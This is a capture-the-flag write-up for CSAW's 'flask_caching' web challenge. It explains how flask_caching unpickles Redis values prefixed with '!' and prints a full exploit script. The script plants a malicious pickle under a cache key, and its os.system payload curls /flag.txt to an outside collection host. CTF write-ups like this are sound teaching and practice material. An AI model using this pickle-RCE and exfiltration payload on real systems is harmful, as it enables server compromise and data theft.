# flask_caching (Web, 300 points)

> cache all the things (this is python3)
> http://web.chal.csaw.io:5000

This challenge serves up a Flask web application where we are able to upload  
a note with a title and file, which it puts into the Redis database. It also
uses `flask_caching` on many endpoints just because. The source code was
provided in `app.py` and the relevant parts are included below:

```python
@app.route('/', methods=['GET', 'POST'])
def notes_post():
    if request.method == 'GET':
        return '''
        <h4>Post a note</h4>
        <form method=POST enctype=multipart/form-data>
        <input name=title placeholder=title>
        <input type=file name=content placeholder=content>
        <input type=submit>
        </form>
        '''

    title = request.form.get('title', default=None)
    content = request.files.get('content', default=None)

    if title is None or content is None:
        return 'Missing fields', 400

    content = content.stream.read()

    if len(title) > 100 or len(content) > 256:
        return 'Too long', 400

    redis.setex(name=title, value=content, time=30)  # Note will only live for max 30 seconds

    return 'Thanks!'

# This caching stuff is cool! Lets make a bunch of cached functions.
@cache.cached(timeout=30)
def _test0():
    return 'test'
@app.route('/test0')
def test0():
    _test0()
    return 'test'
# more cached functions of the same form
```

We have control over the key and content going into Redis, so it seems that we
probably want to leverage that to exploit this app.

The trick is to dig into how flask_caching serializes objects and deserializes
them when it pulls them out of the cache. It turns out it uses pickle to do so,
which is fairly simple to leverage into an RCE.

```
# From flask_caching/backends/rediscache.py
def load_object(self, value):
    """The reversal of :meth:`dump_object`.  This might be called with
    None.
    """
    if value is None:
        return None
    if value.startswith(b"!"):
        try:
            return pickle.loads(value[1:])
        except pickle.PickleError:
            return None
    try:
        return int(value)
    except ValueError:
        # before 0.8 we did not have serialization.  Still support that.
        return value
```

Next we need to find out what key we need to override so that when we hit one
of the cached endpoints it will load out object from the cache and trigger our
RCE. I did this by running the app locally, modifying flask_caching directly,
and logging what keys it was using. I further confirmed this by checking the
keys in my local Redis.

Once we know the key we want to use, it's time to write up the exploit! Here's
what it looks like:

```
from pwn import *
import requests
import pickle
import os

#  URL = "http://localhost:5000"
URL = "http://web.chal.csaw.io:5000"
CACHE_TARGET = "test29"

# I tried various ways to get a full shell but wasn't able to get the connection
# made back to my host, so I used command interpolation with curl instead.
class RCE:
    def __reduce__(self):
        return os.system, ("curl https://postb.in/1599997843300-8184462329372 --data \"$(cat /flag.txt)\"",)

payload = b"!" + pickle.dumps(RCE())
files = { 'content': payload }
data = { 'title': 'flask_cache_view//'+CACHE_TARGET }
res = requests.post(URL, data=data, files=files)
log.success("Exploit payload uploaded")

log.success("Triggering exploit")
res = requests.get(URL+"/"+CACHE_TARGET)
print("GET", res.text)
```

Now when we check out postb.in, we get the flag!
